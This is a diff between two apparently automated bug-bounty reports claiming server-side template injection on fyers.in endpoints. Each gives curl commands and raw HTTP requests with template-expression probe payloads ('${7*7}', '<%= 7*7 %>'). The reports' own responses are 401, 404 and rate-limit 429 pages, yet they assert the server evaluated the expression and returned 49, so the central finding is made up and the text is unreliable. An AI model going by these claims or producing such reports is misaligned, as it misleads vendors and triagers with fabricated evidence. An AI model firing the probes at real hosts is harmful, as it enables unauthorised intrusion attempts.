@@ -1,4 +1,4 @@
-# Server-side template injection in 'issue_id'
+# Server-side template injection in 'onload'
 
 **Severity:** High — The server evaluated an injected expression; command execution was not attempted, so this is not graded Critical.
 
@@ -10,31 +10,31 @@ Input to this parameter is executed as a template expression on the server.
 
 ## Affected Component
 
-- **Endpoint:** `https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1`
+- **Endpoint:** `https://api-connect-docs.fyers.in/recaptcha/enterprise.js?onload=`
 - **Method:** `GET`
-- **Parameter / field:** `issue_id`
-- **Host:** `api-i1.fyers.in`
+- **Parameter / field:** `onload`
+- **Host:** `api-connect-docs.fyers.in`
 - **Authentication required:** No — reproduced unauthenticated
 
 ## Steps to Reproduce
 
 1. baseline, unmodified request:
    ```
-   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1'
+   curl -i -s -X GET 'https://api-connect-docs.fyers.in/recaptcha/enterprise.js?onload='
    ```
-   Server returns `401` — baseline, unmodified request.
-2. template expression injected into 'issue_id':
+   Server returns `404` — baseline, unmodified request.
+2. template expression injected into 'onload':
    ```
-   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1'
+   curl -i -s -X GET 'https://api-connect-docs.fyers.in/recaptcha/enterprise.js?onload=%3C%25%3D+7%2A7+%25%3E'
    ```
-   Server returns `429` — template expression injected into 'issue_id'.
+   Server returns `429` — template expression injected into 'onload'.
 
 ## Proof of Concept
 
 **Request 1** — baseline, unmodified request
 
 ```http
-GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1 HTTP/1.1
+GET /recaptcha/enterprise.js?onload= HTTP/1.1
 Host: TARGET_HOST
 User-Agent: SmartHunt/1.0 (+recon)
 Accept-Encoding: gzip, deflate
@@ -46,24 +46,74 @@ Cookie: ATTACKER_SESSION
 **Response 1**
 
 ```http
-HTTP/1.1 401
-Date: Thu, 06 Aug 2026 05:34:39 GMT
-Content-Type: application/json
-Content-Length: 92
+HTTP/1.1 404
+Date: Fri, 07 Aug 2026 04:41:02 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
 Connection: keep-alive
 X-Content-Type-Options: nosniff
-server: cloudflare
-cf-cache-status: DYNAMIC
+Server: cloudflare
+Last-Modified: Tue, 30 Dec 2025 11:22:56 GMT
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-CF-RAY: a26bac751cc50995-SJC
+x-amz-error-code: NoSuchKey
+x-amz-error-message: The specified key does not exist.
+x-amz-error-detail-Key: recaptcha/enterprise.js
+x-amz-request-id: FC89T42PA9GGQE24
+x-amz-id-2: k4HG0oXukU07Cj+uqqRNxwRbm/OX6SIcwAxdodPdO4IDS8vLpJRVUnZJ9kY9r8ZR16jXVinavD17f5/nFAvZ2nNaYBB7Bx4G
+Cache-Control: public, max-age=14400
+Age: 0
+expires: Fri, 07 Aug 2026 08:41:02 GMT
+cf-cache-status: HIT
+Content-Encoding: gzip
+CF-RAY: a2739b50ba2bd938-LAX
 
-{"s":"error","error_code":-27,"status_code":401,"message":"Could not authenticate the user"}
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>FYERS - Born to Trade</title>
+    <meta name="viewport" content="width=device-width" />
+    <meta name="generator" content="Docusaurus" />
+    <meta name="description" content="Born to Trade" />
+    <meta
+      property="og:title"
+      content="Fyers Â· Your gateway to investing - Free investment in Equity Delivery"
+    />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://your-docusaurus-test-site.com/" />
+    <meta
+      property="og:description"
+      content="Your gateway to investing - Free investment in Equity Delivery"
+    />
+    <meta
+      property="og:image"
+      content="https://your-docusaurus-test-site.com/img/undraw_online.svg"
+    />
+    <meta name="twitter:card" content="summary" />
+    <meta
+      name="twitter:image"
+      content="https://your-docusaurus-test-site.com/img/undraw_tweetstorm.svg"
+    />
+    <link rel="shortcut icon" href="/img/fyers-favicon.png" />
+    <link
+      rel="stylesheet"
+      href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/rainbow.min.css"
+    />
+    <script>
+      (function (i, s, o, g, r, a, m) {
+        i["GoogleAnalyticsObject"] = r;
+        (i[r] =
+          i[r] ||
+          function () {
+            (i[r].q = i[r].q || []).pus
+… [2800 more bytes]
 ```
 
-**Request 2** — template expression injected into 'issue_id'
+**Request 2** — template expression injected into 'onload'
 
 ```http
-GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1 HTTP/1.1
+GET /recaptcha/enterprise.js?onload=%3C%25%3D+7%2A7+%25%3E HTTP/1.1
 Host: TARGET_HOST
 User-Agent: SmartHunt/1.0 (+recon)
 Accept-Encoding: gzip, deflate
@@ -76,7 +126,7 @@ Cookie: ATTACKER_SESSION
 
 ```http
 HTTP/1.1 429
-Date: Thu, 06 Aug 2026 05:34:39 GMT
+Date: Fri, 07 Aug 2026 04:41:03 GMT
 Content-Type: text/html; charset=UTF-8
 Transfer-Encoding: chunked
 Connection: keep-alive
@@ -88,7 +138,7 @@ X-Frame-Options: SAMEORIGIN
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 X-Content-Type-Options: nosniff
 Server: cloudflare
-CF-RAY: a26bac7b183d0995-SJC
+CF-RAY: a2739b534ce2d938-LAX
 
 <!doctype html>
 <!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
@@ -106,7 +156,7 @@ CF-RAY: a26bac7b183d0995-SJC
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <link rel="stylesheet" id="cf_styles-css" href="/cdn-cgi/styles/main.css" /> <script>
   (function(){if(document.addEventListener&&window.XMLHttpRequest&&JSON&&JSON.stringify){var e=function(a){var c=document.getElementById("error-feedback-survey"),d=document.getElementById("error-feedback-success"),b=new XMLHttpRequest;a={event:"feedback clicked",properties:{errorCode: 1015 },helpful:a,version: 1 };b.open("POST","https://sparrow.cloudflare.com/api/v1/event");b.setRequestHeader("Content-Type","application/json");b.setRequestHeader("Sparrow-Source-Key","c771f0e4b54944bebf4261d44bd79a1e");
-b.send(JSON.stringify(a));c.classList.add("feedback-hidden");d.classList.re
+b.send(JSON.stringify(a));c.classList.add("feedback-hid
 … [2800 more bytes]
 ```
 
@@ -117,7 +167,7 @@ b.send(JSON.stringify(a));c.classList.add("feedback-hidden");d.classList.re
 
 ## Expected vs Actual
 
-- **Expected:** ${7*7} is rendered literally as text
+- **Expected:** <%= 7*7 %> is rendered literally as text
 - **Actual:** The server evaluated the expression and returned 49
 
 ## Reproduction Reliability
@@ -132,4 +182,4 @@ Reproduced 3× total, unauthenticated.
 
 ---
 
-Selected from 261 scan finding(s); 177 were informational or hardening-only and are not reportable on their own. Credentials and personal data above are masked.
+Selected from 267 scan finding(s); 168 were informational or hardening-only and are not reportable on their own. Credentials and personal data above are masked.
